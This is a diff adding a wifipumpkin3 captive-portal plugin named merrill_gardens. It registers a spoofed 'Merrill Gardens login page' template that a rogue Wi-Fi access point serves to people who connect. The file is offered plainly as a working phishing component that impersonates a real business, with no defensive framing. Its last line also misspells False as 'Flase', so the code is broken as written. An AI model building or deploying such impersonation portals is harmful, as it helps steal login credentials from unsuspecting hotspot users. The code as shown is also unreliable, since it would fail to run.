@@ -1,0 +1,20 @@
+# file => merrill_gardens.py
+from wifipumpkin3.plugins.captiveflask.plugin import CaptiveTemplatePlugin
+import wifipumpkin3.core.utility.constants as C # import plugin class base
+
+class merrill_gardens(CaptiveTemplatePlugin):
+    meta = {
+        'Name'      : 'merrill_gardens',
+        'Version'   : '1.0',
+        'Description' : 'Merrill Gardens login page',
+        'Author'    : 'paxhumana',
+        'TemplatePath' : C.TEMPLATES_FLASK +'templates/merrill_gardens',
+        'StaticPath' : C.TEMPLATES_FLASK + 'templates/merrill_gardens/static',
+        'Preview' : 'plugins/captivePortal/templates/merrill_gardens/preview.png'
+    }
+
+    def __init__(self):
+        for key,value in self.meta.items():
+            self.__dict__[key] = value
+        self.dict_domain = {}
+        self.ConfigParser = Flase 
